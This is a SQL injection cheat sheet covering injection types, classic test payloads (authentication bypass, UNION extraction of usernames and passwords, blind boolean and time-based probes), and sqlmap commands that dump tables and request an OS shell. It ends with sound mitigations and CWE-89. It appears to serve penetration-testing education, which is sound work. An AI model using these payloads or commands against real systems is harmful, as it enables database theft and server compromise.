# What is SQL Injection?

SQL Injection (SQLi) happens when user input is concatenated straight into a SQL query, letting an attacker change the query's logic. It is one of the oldest bugs on the OWASP Top 10 and still shows up because people build queries with string formatting instead of parameters.

## Types

- **In-band** - results come back in the same response (error-based, UNION-based)
- **Blind** - no direct output; you infer data from boolean responses or time delays
- **Out-of-band** - data is exfiltrated over a second channel like DNS

## Test payloads

```sql
-- Auth bypass classic
' OR '1'='1' --
admin' --

-- Break the query to confirm the bug
'
1' AND '1'='2

-- UNION to pull data (match column count first)
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT username,password,NULL FROM users --

-- Blind boolean
' AND SUBSTRING((SELECT database()),1,1)='a' --

-- Time-based (MySQL / Postgres)
' AND SLEEP(5) --
'; SELECT pg_sleep(5) --
```

## Tools

- [sqlmap](https://sqlmap.org/) - automated detection and exploitation
- [Burp Suite](https://portswigger.net/burp) - Repeater to tune payloads by hand
- [Ghauri](https://github.com/r0oth3x49/ghauri) - fast alternative to sqlmap

## Commands

```bash
# Point sqlmap at a request captured from Burp
sqlmap -r request.txt --batch --dbs

# Dump a specific table
sqlmap -u "https://target.tld/item?id=1" --dump -T users -D shop

# Grab an OS shell if stacked queries are allowed
sqlmap -u "https://target.tld/item?id=1" --os-shell
```

## Manual testing

1. Add a single quote `'` to each parameter and watch for SQL errors or 500s
2. Confirm logic with `' AND '1'='1` (true) vs `' AND '1'='2` (false)
3. Find the column count with `ORDER BY n` until it errors
4. Match types in a `UNION SELECT` and read data
5. If nothing reflects, fall back to boolean or time-based blind

## Mitigation

- Use parameterized queries / prepared statements everywhere - never string concatenation
- Use an ORM correctly (avoid raw query escapes)
- Apply least privilege to the DB account (no `FILE`, no admin)
- Validate and allowlist input types (numeric IDs stay numeric)
- A WAF helps but is not a fix on its own

## Deep dive

- [SQL Injection - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [PortSwigger SQLi labs](https://portswigger.net/web-security/sql-injection)

## CWE

- CWE-89: Improper Neutralization of Special Elements used in an SQL Command
